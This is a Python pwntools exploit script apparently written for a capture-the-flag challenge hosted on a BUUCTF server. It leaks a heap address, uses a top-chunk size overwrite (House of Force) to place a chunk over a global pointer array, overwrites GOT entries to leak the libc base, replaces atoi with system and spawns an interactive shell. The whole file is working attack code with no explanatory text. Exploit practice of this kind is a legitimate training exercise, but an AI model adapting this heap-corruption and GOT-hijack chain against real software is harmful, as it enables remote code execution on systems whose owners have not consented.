from pwn import *
context(arch = 'i386', os = 'linux')
#context.log_level = 'debug'

local = False
if local:
	io = process("./pwn")
	libc = elf.libc
else:
	io = remote('node4.buuoj.cn', 25228)
	libc = ELF("/home/isidro/pwnh/buuctf/libc/u16-x32.so")
elf = ELF("./pwn")

def debug():
	gdb.attach(io)
	pause()

sd   = lambda s    : io.send(s)
sda  = lambda s, n : io.sendafter(s, n)
sl   = lambda s    : io.sendline(s)
sla  = lambda s, n : io.sendlineafter(s, n)
rc   = lambda n    : io.recv(n)
rut  = lambda s    : io.recvuntil(s, drop=True)
ruf  = lambda s    : io.recvuntil(s, drop=False)
addr = lambda s    : u32(io.recvuntil(s, drop=True).ljust(4, b'\x00'))
byte = lambda n    : str(n).encode()
sh   = lambda      : io.interactive()

menu = b'option--->>\n'
def add(size, content):
	sla(menu, b'1')
	sla(b'note content:\n', byte(size))
	sda(b'content:\n', content)

def dele(idx):
	sla(menu, b'4')
	sla(b'the id:\n', byte(idx))

def edit(idx, content):
	sla(menu, b'3')
	sla(b'the id:\n', byte(idx))
	sda(b'content:\n', content)	


payload = b'A'*61 + b'XYZ'
sda(b'name:\n', payload)
rut(b'XYZ')
heap_base = addr(b'!') - 0x8
print("heap_base : ", hex(heap_base))
sda(b'Org:\n', b'A'*0x40)
sla(b'Host:\n', p32(0xFFFFFFFF))


add(0x10, b'A\n')
add(0x10, b'A\n')
add(0x10, b'A\n')
old_top = heap_base + 0x120
chunk_ptr_arr = 0x0804B120
offset = chunk_ptr_arr - old_top - 0x10
print("old_top : ", hex(old_top))
print("offset  : ", hex(offset))
add(offset, b'A\n')
free_got = elf.got['free']
atoi_got = elf.got['atoi']
printf_got = elf.got['printf']
payload = p32(free_got) + p32(printf_got) + p32(atoi_got) + b'\n'
add(0x28, payload)

echo = 0x08048779
edit(0, p32(echo)+b'\n')
dele(1)
rut(b'Hey ')
libc.address = u32(rc(4)) - libc.symbols['printf']
print("libc_base : ", hex(libc.address))
#debug()
system = libc.symbols['system']
edit(2, p32(system)+b'\n')

sla(menu, b'/bin/sh\x00')
#debug()
sh()
